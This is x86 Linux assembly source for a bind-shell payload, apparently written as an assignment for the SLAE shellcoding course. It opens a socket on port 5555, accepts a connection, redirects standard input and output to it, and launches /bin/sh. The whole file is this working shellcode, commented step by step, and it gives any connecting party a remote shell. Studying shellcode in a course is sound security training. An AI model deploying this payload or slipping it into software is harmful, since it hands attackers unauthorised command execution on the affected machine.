;
; Purpose: SLAE Course
; Student ID: SLAE-998
;

global _start

section .text
_start:

	; sys call numbers /usr/include/i386-linux-gnu/asm/unistd_32.h
	; system-specific socket constants /usr/include/i386-linux-gnu/bits/socket.h
	; socket network access protocol /usr/include/linux/net.h

	; socket creation
	; socketcall(int call, unsigned long *args)
	; socket(int domain, int type, int protocol)
	xor eax, eax	; clear eax
	mov ebx, eax	; clear ebx
	push eax	; place 0 in the memory
	mov al, 0x66	; socketcall 102
	mov bl, 0x1	; sys_socket 1

	; place arguments in memory in reverse-order
	push byte 0x1	; type SOCK_STREAM 1
	push byte 0x2	; domain AF_INET 2

	mov ecx, esp	; pointer to sys_socket's args
	int 0x80	; make the sys call

	; bind sys call
	; socketcall(int call, unsigned long *args)
	; bind(int sockfd, const struct sockaddr *addr, socklen_t addrlen)
	mov edx, eax	; save socket descriptor
	xor eax, eax	; clear eax
	push eax	; place 0 in the memory
	mov al, 0x66	; socketcall 102
	mov bl, 0x2	; sys_bind 2

	; struct sockaddr
	push word 0xb315	; bind port 5555 - reverse 0x15b3 # CHANGE THIS
	push word 0x2		; address family (AF_INET = 2)
	mov ecx, esp		; pointer to arguments

	; bind arguments
	
	push 0x10	; address len
	push ecx	; pointer to struct sockaddr
	push edx	; sockfd
	
	mov ecx, esp	; pointer to arguments
	int 0x80	; make sys call

	; listen
	; bind(int sockfd, const struct sockaddr *addr, socklen_t addrlen)
	; listen(int sockfd, int backlog)
	xor eax, eax	; clear register
	push eax	; zero into the memory

	mov al, 0x66	; socketcall 102
	mov bl, 0x4	; sys_listen

	push edx	; sockfd
	mov ecx, esp	; pointer to arguments
	int 0x80	; make the sys call

	; accept
	; socketcall(int call, unsigned long *args)
	; accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen)
	xor eax, eax	; clear eax
	push eax	; push 0 to stack
	push eax	; push 0 to stack
	push edx	; sockfd in memory - first argument

	mov al, 0x66	; socketcall 102
	mov bl, 0x5	; sys_accept

	mov ecx, esp	; pointer to arguments
	int 0x80	; make sys call

	;dup2
	; dup2(int oldfd, int newfd)
	mov ebx, eax	; sockfd to ebx
	xor ecx, ecx	; clear ecx
	mov cl, 0x2	; initialize counter

	loop:
		mov al, 0x3f	; dup2 sys call
		int 0x80	; make sys call
		dec cl		; decrement counter
		jns loop	; make the loop

	; execve
	; execve(const char *filename, char *const argv[], char *const envp[])
	xor ecx, ecx	; clear ecx
	mul ecx		; clear eax, edx

	push eax	; null - string termination
	push 0x68732f6e	; n/sh
	push 0x69622f2f	; //bi

	mov ebx, esp	; pointer to //bin/sh\0
	
	mov al, 0xb	; execve sys call
	int 0x80	; make sys call
